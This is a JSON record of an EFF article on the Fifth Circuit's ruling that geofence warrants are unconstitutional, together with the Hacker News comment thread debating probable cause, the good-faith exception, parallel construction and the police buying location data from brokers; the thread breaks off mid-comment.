[
  {
    "id": 41228630,
    "title": "Federal appeals court finds geofence warrants “categorically” unconstitutional",
    "originLink": "https://www.eff.org/deeplinks/2024/08/federal-appeals-court-finds-geofence-warrants-are-categorically-unconstitutional",
    "originBody": "In a major decision on Friday, the federal Fifth Circuit Court of Appeals held that geofence warrants are “categorically prohibited by the Fourth Amendment.” Closely following arguments EFF has made in a number of cases, the court found that geofence warrants constitute the sort of “general, exploratory rummaging” that the drafters of the Fourth Amendment intended to outlaw. EFF applauds this decision because it is essential that every person feels like they can simply take their cell phone out into the world without the fear that they might end up a criminal suspect because their location data was swept up in open-ended digital dragnet. The new Fifth Circuit case, United States v. Smith, involved an armed robbery and assault of a US Postal Service worker at a post office in Mississippi in 2018. After several months of investigation, police had no identifiable suspects, so they obtained a geofence warrant covering a large geographic area around the post office for the hour surrounding the crime. Google responded to the warrant with information on several devices, ultimately leading police to the two defendants. On appeal, the Fifth Circuit reached several important holdings. First, it determined that under the Supreme Court’s landmark ruling in Carpenter v. United States, individuals have a reasonable expectation of privacy in the location data implicated by geofence warrants. As a result, the court broke from the Fourth Circuit’s deeply flawed decision last month in United States v. Chatrie, noting that although geofence warrants can be more “limited temporally” than the data sought in Carpenter, geofence location data is still highly invasive because it can expose sensitive information about a person’s associations and allow police to “follow” them into private spaces. Second, the court found that even though investigators seek warrants for geofence location data, these searches are inherently unconstitutional. As the court noted, geofence warrants require a provider, almost always Google, to search “the entirety” of its reserve of location data “while law enforcement officials have no idea who they are looking for, or whether the search will even turn up a result.” Therefore, “the quintessential problem with these warrants is that they never include a specific user to be identified, only a temporal and geographic location where any given user may turn up post-search. That is constitutionally insufficient.” Unsurprisingly, however, the court found that in 2018, police could have relied on such a warrant in “good faith,” because geofence technology was novel, and police reached out to other agencies with more experience for guidance. This means that the evidence they obtained will not be suppressed in this case. Nevertheless, it is gratifying to see an appeals court recognize the fundamental invasions of privacy created by these warrants and uphold our constitutional tradition prohibiting general searches. Police around the country have increasingly relied on geofence warrants and other reverse warrants, and this opinion should act as a warning against narrow applications of Fourth Amendment precedent in these cases.",
    "commentLink": "https://news.ycombinator.com/item?id=41228630",
    "commentBody": "Federal appeals court finds geofence warrants “categorically” unconstitutional (eff.org)520 points by computerliker 23 hours agohidepastfavorite165 comments Terr_ 22 hours agoEven if practices so far have been unconstitutionally broad and sloppy, are there any scenarios where such a warrant for that kind of data could be valid? For example, a small cottage in the woods is burned down with gasoline on a night the owner is absent. The police want to find the arsonist by asking for phones that connected to that tower that night, and there happen to be only 3 results, two of which are known neighbors. Still too broad? In other words, should some of this hinge on the varying size/specificity of the result-set, rather than the query-parameters in isolation? reply andrewla 3 hours agoparentFrom this decision is it doubtful that a judge would grant the warrant under any circumstances -- the knowledge, for example, that there are only three results, is only available after the warrant is executed. Since no warrant would be so granted, the data that only three results are found would never be discovered. A judge could always choose to grant the warrant, but with full knowledge that any evidence uncovered will likely be inadmissible. Even if a judge grants such a warrant, it would likely be contested by the service provider (Google), and another judge would need to sign off on it, and likely an appelate court would have to deny certiorari in order. And even if it was allowed, at trial all of this would again be litigated with a fresh set of judges, and once again have to navigate up the apellate courts, and would most likely impair or cripple the prosecution of a case where it was used. There might be exigent circumstances where the public needs outweigh the prosecutorial damage -- preventing an imminent bombing or something, but for routine criminal matters the geofence warrant is all but dead. reply saghm 58 minutes agorootparent> There might be exigent circumstances where the public needs outweigh the prosecutorial damage -- preventing an imminent bombing or something, but for routine criminal matters the geofence warrant is all but dead. Is there a strong reason to assume one way or another about whether this will get reviewed by the Supreme Court (and if so, whether it would be upheld)? My understanding is that the Fifth Circuit has become a bit notorious in recent years for its rulings being a bit out of the norm and reviewed disproportionately by the Supreme Court, but I don't know enough about whether this decision might be one of those. reply abduhl 20 minutes agorootparentI don’t think that this is a fair characterization of what it means for a circuit to have one of its decisions be heard by the Supreme Court. It makes it seem like being “reviewed” by the Supreme Court is a proxy for “out of the norm,” and that’s not the test for Supreme Court review. Many times a case will be heard out of a circuit where that circuit applies the same logic as the majority of other circuits, so the claim that there is a strong correlation between the circuit and adherence to the majority view seems extraordinary on its face. Recall that the Supreme Court generally gets to decide what cases it hears and what it’s said about the cases it wants to hear is at https://www.law.cornell.edu/rules/supct/rule_10. It basically boils down to cases where there is a conflict between any two chains of appeals (federal circuits and states). But the Supreme Court is lazy (or smart), so when there is a conflict they usually want to see how other judges think and to see if a majority vote will arise. The cases that get granted are therefore normally just from one of the last circuits to adopt a view (often one of the previously espoused views from the other circuits), and I would need to see the data to believe that there is a bias with respect to whether they adhere to the majority view (if it exists). reply hwillis 21 hours agoparentprevA suspect runs into a garage with several unlocked cars, including yours. The suspect had drugs when he went into the garage and didn't when he came out. The drugs may be in any of the cars or none of them. You would not get a search warrant in that case unless your car was the only one in the garage. The police don't know if there is three or even one phone connected to the tower in that time, and they should not get a warrant. reply KoolKat23 11 hours agorootparentA better analogy here, as some seem to struggle, would be the dealer goes into an apartment building and comes out empty handed, it could be in any of the apartments or none. reply crazygringo 20 hours agorootparentprevWait, really? If police say they have extremely good evidence to believe the drugs are in the garage, in the scenario you described, a court wouldn't issue a search warrant for the garage including any cars it contains? I'm genuinely surprised. Is there a name for whatever legal principle prevents the court from doing so? I'd like to learn more about this. Because from Wikipedia [1], I'd have assumed that this would be a cut-and-dried instance of probable cause [2]. Is it about the vehicle owners being different from the garage owner? Edit: some quick googling seems to indicate that search warrants in the US can be issued to include all or specifically identified vehicles on a property, but no indication of what conditions need to be met. [1] https://en.wikipedia.org/wiki/Search_warrant#United_States [2] https://en.wikipedia.org/wiki/Probable_cause reply DANmode 16 hours agorootparentIt really depends on what is, at the time, considered \"reasonable\" search by the people with the monopoly on the violence. reply BirAdam 5 hours agorootparentprevgenerally, most laws are overlooked when the situation involves drugs. Cops can search you, your car, whatever on suspicion that drugs may be present. reply Terr_ 19 hours agorootparentprev> You would not get a search warrant [for several unlocked cars] Hold up, you state that rather firmly but what's the reasoning that supports it? What's the rationale that separates 1 car from \"several\" for probable cause? ____ I feel there's a risk of conflating: 1. Good reason to believe X is somehow involved a crime. 2. Probable cause to search for/inside something owned by X. While there is a strong correlation between the answers to those two questions, they are definitely not the same. reply hwillis 2 hours agorootparentI wanted something slightly more realistic. It works just as well if the garage is an apartment building where everyone keeps their apartment unlocked. reply CPLX 12 hours agorootparentprevThe guy is making no sense. Or picked a bad fact pattern to make a point. In the case he's describing you'd just get a search warrant for the garage and everything in it. Or, if you could establish probable cause (which seems likely here) you'd just go look for the drugs. reply tantalor 21 hours agorootparentprevHow far can probable cause stretch? Can I say, \"well it's probably in one of those 3 cars\" so then I can get a warrant? After the Boston Marathon bombing, they searched a 20-block area for the suspect (and found him). Was that legal? reply vngzs 21 hours agorootparentThere's actually a Slate article covering this topic[0]. First, consent was given for certain homes. However, the article also notes that under \"exigent circumstances\" warrantless searches are permitted: > In exigent circumstances, or emergency situations, police can conduct warrantless searches to protect public safety. This exception to the Fourth Amendment’s probable cause requirement normally addresses situations of “hot pursuit,” in which an escaping suspect is tracked to a private home. But it might also apply to the events unfolding in Boston if further harm or injury might be supposed to occur in the time it takes to secure a warrant. A bomber believed to be armed and planning more violence would almost certainly meet such prerequisites. [0]: https://slate.com/news-and-politics/2013/04/boston-bomber-ma... reply nvy 21 hours agorootparentprevA resident found him in his boat in his back yard and called police. reply HeatrayEnjoyer 21 hours agorootparentprevWasn't it a voluntary search? reply lesuorac 21 hours agorootparentprev> After the Boston Marathon bombing, they searched a 20-block area for the suspect (and found him). Was that legal? Uh, why wouldn't a cop be allowed to walk/drive/fly-over public roadways in a 20-block area and look from public land in any direction? Also do note, they knew specifically who they were looking for and had location data from their cellphones [1]. Not a judge, but if I was and somebody wanted a search warrant to find a person at a location and their evidence was the dude's cellphone is there, I'd grant it. [1]: https://en.wikipedia.org/wiki/Dzhokhar_Tsarnaev#Manhunt_and_... reply deelowe 21 hours agorootparentprev> The police don't know if there is three or even one phone connected to the tower in that time. Huh? The entire point the parent was making is that they do \"know\" which cell phones were connected during specific times. reply andrewla 21 hours agorootparentIn the specific cases in question, the officers had video evidence of one of the perpetrators using a cell phone, and used that to justify the warrant. The court ruled that even this was insufficient, but is part of the reason why they are not applying the exclusionary rule to these cases even though the evidence itself is inadmissible. reply bryant 21 hours agorootparentprev> Huh? The entire point the parent was making is that they do \"know\" which cell phones were connected during specific times. As I understand it, the point is that law enforcement does not know this, and thus they send a request to the service provider for all devices within this geofence within this timebox. The service provider must then search the entirety of the relevant datastores for devices matching the geo- and time requirements. reply wordpad25 21 hours agoparentprevI think maybe they will still use it, it's just not admissable as evidence in court reply hwillis 21 hours agorootparenthttps://www.law.cornell.edu/wex/fruit_of_the_poisonous_tree > Fruit of the poisonous trees is a doctrine that extends the exclusionary rule to make evidence inadmissible in court if it was derived from evidence that was illegally obtained. reply andrewla 21 hours agorootparentGP is probably referring to the practice of \"Evidence Laundering\" which has been deployed from time to time by law enforcement. Still dubious that this would be used that way just because telecoms would be aware of this potential for misuse and would not give the data up without a subpeona or warrant, which under this ruling would not be allowed. reply cryptonector 21 hours agorootparentGovernment: we want a geofence warrant for ... Court: no Government: how much $ for this data? Telco/bigtechco: ah, now we're talking reply salawat 10 hours agorootparentLegislative branch: No spending on that. Executive: ...Ah... reply ceejayoz 6 hours agorootparentMore like \"Executive: lol\". reply ceejayoz 21 hours agorootparentprevhttps://en.wikipedia.org/wiki/Parallel_construction Another officer will get an \"anonymous tip\". reply hwillis 2 hours agorootparentSearch warrants are usually public record after they are unsealed. If they aren't included in evidence its a Brady violation and if caught the case is essentially dead. If the defense sees that the search warrant was given or executed first, they probably have a very strong argument that all the evidence is tainted. Parallel construction doesn't work very well when proof of tainted evidence is publicly available. reply FireBeyond 16 hours agorootparentprev\"Our Confidential Informant, Fuzzy Dunlop\". Two cops on The Wire do this, and basically register a tennis ball, hence the name, as their CI - https://www.youtube.com/watch?v=9GJa1_u-VLE reply cryptonector 21 hours agorootparentprevBack reconstruction enters the chat reply from-nibly 21 hours agoprev> it is essential that every person feels like they can simply take their cell phone out into the world without the fear that they might end up a criminal suspect because their location data was swept up in open-ended digital dragnet. This single ruling, does nothing to make me feel any better about this. Everyone can be swept up in \"some digital dragnet\" because everyone's data is everywhere, and it's impossible to manage without hauling off to the woods and disconnecting from the internet at large. reply cryptonector 20 hours agoparentThis ruling is a huge step in the right direction. To gather all the data you speak of requires some entity (entities, really) -currently not the government- to gather it and then make it available for subpoenas and warrants, which would then fall [in the 5th circuit anyways, right now] under this precedent. The government could get into the business of building [under cover] popular apps so as to gather that data themselves, but that would take a great deal of time and money, and most importantly competence! reply NegativeK 14 hours agorootparentAs the sibling comment points out, the government doesn't need a subpoena if companies hand over the data willingly (typically for a fee.) I can't see this being fixed until America decides that the rights to our identifying data can't be signed away. reply cryptonector 3 hours agorootparentEven I said that in an earlier comment (https://news.ycombinator.com/item?id=41229845). Still, this is a step forward. The step might be to forbid the government bypassing legal protections by buying the data. reply bilbo0s 10 hours agorootparentprevTrue. This ruling says you can't subpoena data. It doesn't say you can't buy it. The free market is an enormous whole in our privacy rights. At the same time, it's crazy that we ourselves put all of our data out there on the free market. reply sroussey 20 hours agorootparentprevOr just pay a data broker. reply walrushunter 6 hours agoparentprevIs it really essential? I don't feel like this ruling changes my chances of being falsely accused of a crime at all. All it really does is take away a tool police could use to find the right person. reply zo1 5 hours agorootparentThere is no reasoning with \"privacy advocates\" on this. Your argument is essentially \"think of the children\" to their ears and they're used to blocking it out categorically without thinking. No amount of \"checks and balances\" and \"valid scenarios\" will convince them otherwise. They've decided that their arbitrary notion of privacy is some sort of \"human right\" and will drag us all to hell because of it. In the meantime, they refuse to participate with lawmakers to tread a middle-ground so the laws end up being utterly draconian (see the EU stuff happening in real time) against ordinary citizens. Oh and don't even get me started on the kicker, whereby most of law-enforcement simply refuses to enforce and prosecute the bulk of uncomfortable crime they encounter (see the US and UK right now where they let criminals loose on their populace because they're afraid of the \"optics\"). I honestly don't know what kind of f-d up world we're leaving to our children. But they will judge us very harshly for it someday. reply datahack 19 hours agoprevThis is fantastic. I’ve worked on this problem and it’s an incredible invasion of privacy. However, until we get clarification from FISA courts we will still have to deal with it. The problem is the line where FISA has been used to acquire information for criminal prosecution rather than for intelligence purposes, and the broader and broader definition of terrorist and the dramatic expansion of domestic watchlists in recent times. Let’s hope that it gets unilaterally outlawed and then FISA is forced to follow the supreme law of the land in future rulings. reply fsckboy 22 hours agoprevI'm pretty up on current events, but I did not know/recall what a geofence warrant is. It's the \"what cellphones pinged here\" search warrant: A geofence warrant is a type of search warrant that allows law enforcement to collect location data from devices within a specific geographic area (the \"geofence\") during a particular time period. This warrant enables investigators to: 1. Identify devices present in the area 2. Collect location data, such as GPS coordinates or cell tower information 3. Link devices to specific locations and times reply cryptonector 20 hours agoparentIt's also \"what devices Google saw in these areas at these times\", which is much higher quality than cell tower triangulation. reply ImaCake 20 hours agoparentprevThe article appears to be deliberately obfuscating the definition to keep the reader hooked for longer. The link to the article that describes a geofence is even more transparent about it. reply toomuchtodo 22 hours agoprevRelated: No reasonable expectation of privacy in one's Google location data - https://news.ycombinator.com/item?id=40958458 - July 2024 (163 comments) reply alistairSH 5 hours agoparentSo, the police can't use the cell tower, but they can use Google's location data, which is arguably higher quality anyway? I guess I'll take the small win, but I'd prefer the police don't have access to any type of blanket warrant. reply kevin42 4 hours agoparentprevOne decision is by the fourth circuit, the other is the fifth. I don't know enough about the details, but in situations like this, the Supreme Court takes the case to resolve discrepancies. reply londons_explore 22 hours agoparentprevWonder if this case will make google backtrack on their move to purge all location data from their users server-based location histories? reply hed 22 hours agoprev> Unsurprisingly, however, the court found that in 2018, police could have relied on such a warrant in “good faith,” because geofence technology was novel, and police reached out to other agencies with more experience for guidance. This means that the evidence they obtained will not be suppressed in this case. That the guy's case gets a right affirmed yet in his individual case it won't make a difference has to be a pretty bitter pill to swallow. reply andrewla 21 hours agoparentI am not a lawyer, but the language of the opinion [1] seems to indicate that the geofence itself is not admissible, but evidence obtained as a result of it is still admissible: > On November 4, 2022, Smith filed a Motion to Suppress— which the other Appellants joined—seeking to suppress all evidence derived from the November 2018 geofence warrant which was used to identify them as suspects. They were identified as suspects, and further investigation produced more evidence, which formed the case. What they are saying is that the good faith exception prevents this from tainting all derived evidence in this case, which seems reasonable. The good faith exception is an exception to the exclusionary rule, not to the admissibility of the evidence itself. [1] https://www.ca5.uscourts.gov/opinions/pub/23/23-60321-CR0.pd... reply flavius29663 20 hours agorootparent> the opinion [1] seems to indicate that the geofence itself is not admissible, but evidence obtained as a result of it is still admissible That means they can geofence to get a short list of suspects, and then file proper warrants for some of them if they have more clues? reply burkaman 20 hours agorootparentNot anymore, now that this precedent is set. reply ticviking 20 hours agorootparentI'm still wondering how this precedent prevents parallel construction nonsense reply jwsteigerwalt 19 hours agorootparentThere was a warrant in this case. That type of warrant is now deficient and electronic data holders like Google with easily refute future attempts to get data with a clearly deficient warrant. Parallel construction typically means a warrant was not given on the first pass. reply parineum 18 hours agorootparentIt doesn't encourage Parallel construction unless you think any restriction on warrants does. reply raincom 18 hours agorootparentprevThis precedent doesn't prevent parallel construction at all. In fact, it encourages parallel construction. reply moomin 19 hours agorootparentprevIn this case it’s pretty simple: they won’t be able to obtain geofence warrants in the future. reply kevin_thibedeau 13 hours agorootparentSomewhat a shame since they have successfully tracked down serial killers by winnowing cell phones common to multiple crime scenes. reply bigiain 18 hours agorootparentprevSo now we just have to rely on Google/Apple/cell-carriers to not hand over all the geofence data without a warrant. I'm sure the cops will be leaning _heavily_ on 3rd Party Doctrine next time they call up Google with their warrantless geofence data requests. reply pgalvin 9 hours agorootparentInterestingly, Google has recently started to shift their entire infrastructure for location tracking off their servers and onto users’ devices. Motivated in part by geofence warrants (and, in this commenter’s opinion, perhaps by anti-abortion laws in the US too). It’s actually rather frustrating for me as I used to export and keep the GPS logs, for geotagging photos from a camera, which will need to be done per day now. Nonetheless, a smart move as they simply won’t hold this information anymore - even for those who opt-in to the feature. reply cortesoft 18 hours agorootparentprevWell they need the warrant to get Google to give them the information in the first place, so they would not have the data to create the parallel construction. reply vkou 17 hours agorootparentprevNo legal precedent can prevent parallel construction, because when it is done right, nobody but the police are actually aware that it took place. reply andrewla 3 hours agorootparentWithout speaking of the general case, this specific legal precedent does prevent parallel construction for this particular source of data. In order to obtain the data that law enforcement would have to \"discover\" through parallel construction, they need Google to cooperate and run the analysis to give them the required data. They can try to make this request through informal channels, but Google will say that they need a warrant. They can't make the request through formal channels because no judge will give them a warrant. So that's pretty much it. reply gamblor956 1 hour agorootparentprevParallel construction is this huge phantom menace on the internet but something that in real life occurs less frequently than a person being struck by lightning. Law enforcement faces a very high burden to show that parallel construction would apply. (Not \"could.\" Would.) This generally requires law enforcement to show that they were pursuing multiple parallel paths of investigation, and that basic investigatory work in one of the other paths of investigation would have legally led to the excluded evidence as a matter of course. To put it perspective how difficult this is, a former co-worker that is still with the public defender has seen the prosecutor succeed exactly once in 15 years in making a parallel construction argument. The DEA is the only agency that successfully makes parallel construction arguments on a regular basis, and this is primarily because the DEA has the resources to actively pursue multiple parallel paths of investigation, and because in many cases the reason for using parallel construction is that key witnesses have a tendency to get murdered.... reply refulgentis 19 hours agorootparentprevI'm confused how parallel construction plays in here, nonsense adds another layer of confusion, but an attempt to help, tl;dr: the 5th Circuit has held that requesting a list of people/IPs/devices in a location is not permissible. I'm just trying to guess a gap: engineers tend to see law as more iron, like code, and judge law based on inverse programming: if you can find some set of circumstances that creates a gap where the law isn't obeyed. Ex. here, you might mean that this doesn't technically stop police from requesting geofenced data anyway, using it to get suspects, then not mentioning it at trial. Yes, technically, the police could ignore this, and request a warrant, then the judge could ignore it, then the tech companies could ignore it, the DA could collude with the police to hide that happened, and pretend they found the suspect a different way. But it's impractical. It's hard to spell out why, exactly, tl;dr: death penalty for your career if any of this is discovered by anyone, you can't do it by yourself, and these people are generally on the same team in our distanced analysis, people are tribal, and gov't attorneys/tech companies/judges/police can't rely on eachother's silence. reply dataflow 18 hours agorootparent> It's hard to spell out why, exactly, tl;dr: death penalty for your career if any of this is discovered by anyone How many careers have ended over discovery of parallel construction? reply refulgentis 17 hours agorootparentThis is making me grimace, because I went to some lengths to spell it out politely and at length to avoid as many freshman dorm rooms quips as possible, and yet, I still got one Sir, parallel construction ever happening has nothing to do with what we're talking about, how the legal system enforces its decisions without assigning a cop to each American, and then a cop to watch that cop, and then a cop to watch that cop, and then a cop to watch the cop. The only way this isn't a lazy quip is if you're a full on \"abolish the legal system\" anarchist or a full on \"with the correct DAG of cops we will finally enforce laws on each other\" reply dataflow 16 hours agorootparentYou're reading things into my comment that I never said. I'm not the same person you were previously replying to, in case that confused you. > parallel construction ever happening has nothing to do with what we're talking about I never said the two cases have anything to do with each other. What I see is similarities between the two regarding your reasoning. That is, they both require the government agents doing something that you'd think would jeopardize their careers, and yet they're getting away with it all the time... because they actually do manage to successfully hide the practice from the courts when trial time comes. If just reading \"parallel construction\" is inducing a knee-jerk reaction from you, look at other examples of perjury and how many careers ended over them. Here [1] is one article I'll quote for you: A former San Francisco Police commissioner [said] \"One of the dirty little not-so-secret secrets of the criminal justice system is undercover narcotics officers intentionally lying under oath. [...] It is the routine way of doing business in courtrooms everywhere in America.\" ... Justice [...] of the State Supreme Court in Brooklyn condemned a widespread culture of lying and corruption in the department’s drug enforcement units: “I thought I was not naïve [...] but even this court was shocked, not only by the seeming pervasive scope of misconduct but even more distressingly by the seeming casualness by which such conduct is employed.” If you're going to claim the \"engineers\" here are \"lazy\" or otherwise ignorant about the robustness of the US legal system, you'll need to do more to enlighten them than wave your hands around saying \"it's hard to spell out why it's impractical\" with vague game-theoretical explanations. Because to a lot of folks here, this kind of stuff is clearly still happening, regardless of what you believe about the difficulty of distributed coordination or the explanatory power of game theory. [1] https://www.nytimes.com/2013/02/03/opinion/sunday/why-police... reply bongodongobob 20 hours agorootparentprevI don't see how that's reasonable. \"Well we kicked down the door to your house, which was wrong, but look at all this good evidence we got! I mean, c'mon, the guy is clearly guilty...\" reply jkeuhlen 20 hours agorootparentIntent is the key to the good faith exception here. If you intend to kick down a door to find evidence of wrongdoing, anything you find is inadmissible. But if you kick down a door because someone on the other side is screaming for help, evidence of other wrongdoing that you find is admissible still. Here, they are saying that they had good reason to believe they could operate in the way that they did, so while the geofence evidence itself isn't able to be used, other evidence derived from that work is still usable. But going forwards, no one can use the geofence technique in good faith. reply justinclift 19 hours agorootparentBear in mind that physical cash is somehow able to be charged with crimes, thus enabling police theft via civil asset forfeiture. Even when the police had no reason to suspect there was any cash on people in the first place. So it doesn't seem like much of a step to \"the evidence was screaming to us from inside, begging to be found\". It's about the same level of nonsense. ;) reply nradov 18 hours agorootparentCivil asset forfeiture is problematic and has been abused but it's completely separate from criminal evidence rules. The physical cash is never charged with a crime. Instead the government files a civil (not criminal) case alleging that the cash is the result of criminal activity. The burden of proof then is much lower than in a criminal trial, and often the plaintiff wins a default judgement. reply justinclift 18 hours agorootparentAwesome. Now adapt that to evidence inside a house begging to be found. :) reply IIAOPSW 18 hours agorootparentYou can't. Civil court is different from criminal court. The standards are different. reply parineum 18 hours agorootparentprev> So it doesn't seem like much of a step Rebuttal, that seems like a huge step. reply bongodongobob 18 hours agorootparentprevAnd intent is notoriously hard to prove. As long as there isn't an email saying \"fuck the laws break it down\" good luck proving the cops were the bad guy and every judge will side with them all day long. \"Ope, another clerical error, Joe Admin Assistant screwed it up, we were just following orders.\" reply brewdad 17 hours agorootparentprevIf “I thought they had a gun” is a free pass for cops to murder why won’t cops simply say “I thought I heard a cry for help” when they kick a door down without a warrant? reply Narhem 19 hours agorootparentprevNot even a good analogy when it comes to technology. Standing close to the door could be considered illegal and even if you had the legal right to entire anything you would find could be inadmissible. reply bongodongobob 16 hours agorootparentNo, the analogy is breaking a rule in \"good faith\". It's absurd. Regular citizens can't do that. Ignorance of the law or \"good intentions\" isn't a defense for a normal person. reply GeekyBear 19 hours agoparentprevRelevant: > Good faith provides an exception to the Fourth Amendment exclusionary rule barring the use at trial of evidence obtained pursuant to an unlawful search and seizure. If officers had reasonable, good faith belief that they were acting according to legal authority, such as by relying on a search warrant that is later found to have been legally defective, the illegally seized evidence is admissible under this exception. https://www.law.cornell.edu/wex/good_faith_exception_to_excl... It's unfortunate for the defendant, but does follow existing precedent. reply OldSchool 20 hours agoparentprevWas \"Stop and Frisk\" by the NYPD also in good faith for the decade or more that it took to get it declared unconstitutional? reply cryptonector 22 hours agoparentprevIt also makes it hard for the government to appeal the ruling, which then might just stand as precedent throughout the 5th circuit. reply MediumOwl 10 hours agoparentprev> That the guy's case gets a right affirmed yet in his individual case it won't make a difference has to be a pretty bitter pill to swallow. Big Jean-Marc Bosman energy, who essentially changed the face of football (soccer) forever in the 90's because his club didn't want to let him leave, but he didn't play anymore all the trials. reply khuey 21 hours agoparentprevBasically every noteworthy Fourth Amendment case works this way unfortunately. reply refulgentis 19 hours agoparentprevThat's why I love the law's ability to consider context: the structure protects what is right over the pedantic, here, letting a violent criminal skate 6 years later because of new thinking. reply RetpolineDrama 21 hours agoparentprevWhat utter nonsense on behalf of the courts. The \"good faith\" defense is irrelevant to the finding that a fundamental right was violated, and to deny the original defendant relief like this is just absurd. reply ARandomerDude 18 hours agorootparentExactly. The fundamental assumption of the Bill of Rights is that governments do not operate in good faith. If they did, there would be no need to spell out how the government is not allowed to abuse you. reply parineum 18 hours agorootparentprevIt's more complicated than that. All they really did was suspend the \"fruit of the poison tree\" doctrine. The evidence gathered by the now ruled unconstitutional methods is not allowed to be used but the evidence gathered afterwards is still admissable where it normally would not be. In this case, they can't use the geofence data of their locations as evidence but, after they used that to identify suspects, they can use all evidence gathered afterwards where that would normally not be allowed. reply cryptonector 21 hours agorootparentprevThis is a way for the courts not to get bad press. For the defendant at the time this is a terrible ending. For everyone else it's still nice. From a court's perspective this is a good compromise. reply Supermancho 20 hours agorootparentIf this was about discrimination of race, as a rights violation, it is clear that good faith is irrelevant. Rights supercede good faith and the presumption or previous decisions are improper. reply salawat 10 hours agorootparentprevNo it isn't. This is one of those cases where by tweaking things as such the Judiciary has shown that it cannot be trusted to keep the Executive in line. Again. The Courts are coming out of this looking even worse than they have been. reply cryptonector 3 hours agorootparentI don't disagree. But I'm telling you how I think the judges feel about this, not how you should feel about it. reply grahamjameson 19 hours agoprevPerhaps someone has already commented this, but LE can still purchase data from data brokers circumventing need for a warrant. That’s not to say that this isn’t an important step in the right direction, rather it’s to point out that there is still work to be done. reply ckemere 20 hours agoprevNaive question - how is geofence different than security camera footage of the street? It also includes indoor areas? reply andrewla 21 hours agoprevInteresting tangent to this is that Google has recently announced that they are shutting down their \"Timeline\" service in favor of having that information stored locally on the user device. I wonder if this is a \"do no evil\" reaction to geofence warrants -- if Google does not have the information they cannot give it to law enforcement. This has been Google's practice in other situation (GDPR) where retaining information inherently exposes Google's customers to law enforcement violations of their privacy via Google itself. reply weaksauce 21 hours agoparent> do no evil google dropped that slogan a decade or more ago reply andrewla 21 hours agorootparent> And remember ... don't be evil, and if you see something that you think isn't right -- speak up! [1] [1] http://abc.xyz/investor/google-code-of-conduct reply mc32 21 hours agorootparentPlease snitch. No, I mean it, snitch on the dirty things Google does in gathering user data and selling behavioral data to the largest bidder. I'm for total blind advertising. Non-targeted --not on the individual level. No smaller than ZIP. reply ikmckenz 20 hours agorootparentprevNo, they didn’t. After corporate restructuring, parent company Alphabet uses a different cute slogan, while Google retains “don’t be evil” in their code of conduct. reply xyst 21 hours agoprevCan a FOIA request reveal if your phone has ever been included in one of these geofence warrants? reply gpm 19 hours agoprev> As the court noted, geofence warrants require a provider, almost always Google, to search “the entirety” of its reserve of location data I haven't read the ruling, but this has always struck me as the key problem with geofence warrants that courts have been ignoring. A geofence warrant doesn't just involve a search of the location data that is in the area, it involves a search of all the location data collected worldwide to determine that it wasn't in the area. It couldn't be less localized. reply ggm 19 hours agoprevThe most important thing to remember reading this, for most of us (including myself) is the phrase: I Am Not A Lawyer The construction of \"but what does it mean\" invites the response: \"it depends\". I wouldn't depend on a theory or statement from anyone not involved in the law here. I have no idea how this will or will not limit the use of geofence technology, warrented or otherwise. reply dmvdoug 18 hours agoparentAnd, now that there is a circuit split, this is squarely teed up for the Supreme Court, and there’s really no telling how they’ll come out. reply hnburnsy 17 hours agoprevCities are already building their own tracking networks with APLR, Bluetooth, TPMS, toll transponders, etc. I would imagine someday, police will say geofence every radio detected by a their (or third parties) sensors network and then drive around looking for those radios, or wait until they pass one of their detectors again. reply whartung 20 hours agoprevSo, this is about taking a blind sample of an area to see if anyone is suspicious. This is in contrast to having a named suspect, and then analyzing their phone data to see if they were in the area? That's still legit discovery? reply fortran77 22 hours agoprevThey are a very effective tool for finding burglars. That's how many burglaries are solved in my area. If the exact time of the burglary is known (from alarm or security camera) a very specific warrant is given for all phone activity at or near that time at that location. I'm hoping if the warrent is more specific (perhaps finding similar burglaries and requesting information only for matches between the two locations) they can still be used. reply ziddoap 22 hours agoparentThey are also quite effective at subjecting completely innocent people to criminal investigations. reply deelowe 21 hours agorootparentExactly. Some people seem to have the opinion that a thing is good if it generally proves effective a capturing criminals. Others have the opinion that capturing criminals is only good if there's a very low risk of innocents being caught up in the process. I'm in the latter group. reply alwa 21 hours agorootparentIn general, though, doesn’t more (and more reliable) information permit more accurate conclusions? Wouldn’t this type of data reduce the risk of innocents being caught up, compared to asking cops or neighbors to hazard their best guess at who might have been around at the time of the crime? reply marcosdumay 19 hours agorootparent> Wouldn’t this type of data reduce the risk of innocents being caught up This really depend on how you use the data, doesn't it? If you have a presumption any suspect is innocent, and investigate until you have overwhelming evidence, yes, it does. If you have a presumption whoever the algorithm selects is guilty, and investigate to prove it, this gives you exceptional capabilities to persecute whoever you catch. reply alwa 13 hours agorootparentI definitely agree that it depends on how you use the data, although that seems to bleed into a judicial rather than an investigatory role. In the case of this geofence kind of data request, though, it seems to self-enforce that a little bit, though, right? If you cast too broad a net, then you “catch” hundreds of people, and the jury rolls their eyes at you pointing the finger at any arbitrary one of them. If you construe the request narrowly, then you get a small number of leads, but those leads are in actual fact that much more incriminating by dint of how precise they are. In some sense it reminds me of the way the squishier sciences dealt with p-hacking by normalizing preregistration: you kind of have to set the “power” of your request ahead of time, or the black box that spits out the results becomes less useful to you (and less convincing to the people you have to make agree with you). reply marcosdumay 2 hours agorootparentYes. And law enforcement seems to have consistent problems with p-hacking any new kind of evidence they are allowed to have. That's why the use of things like this tends to be denied. That said, if some country manages to create a law enforcement organization with the right culture, it does indeed become much less of a problem. But it needs to guarantee the culture won't change either, and that the data won't become available for different organizations. reply deelowe 19 hours agorootparentprevWhat makes you think the government cares about accuracy? I’m pretty sure they only care about the size of the net, not what it catches. reply alwa 13 hours agorootparentI think cops (or at least their bosses) care about their arrests resulting in successful prosecutions. A request ambiguous enough to net hundreds of suspects seems unlikely to net the investigator a successful prosecution. Not without corroborating evidence, which might be the fruit of a thorough investigation. But if the initial request leads to an investigation that develops enough evidence to prosecute somebody—that is, if the person really did do the bad thing, and this was one of the ways the government figured that out—what is it that’s so abhorrent about this technique that makes it right to overlook the bad deed? If the status quo is throwing around nonsense like bite marks and sneaker prints to try and associate somebody with a crime scene, geofenced mobile data requests seem like a smaller rather than a bigger net compared to “everybody with teeth who I have a hunch about” or “everybody who owns Sketchers.” reply dghlsakjg 3 hours agorootparent> I think cops (or at least their bosses) care about their arrests resulting in successful prosecutions. A successful prosecution is measured by a guilty plea or a finding of guilt. It is not the same thing as justice or convicting the right person. There are mountains of cases where it is clear that prosecutors are playing with dirty tricks for a conviction of anyone, rather than seeking to convict the right person. reply jliptzin 20 hours agorootparentprevI’m ok with TVs and jewelry getting stolen occasionally if it means my government is not constantly tracking my every move reply alwa 13 hours 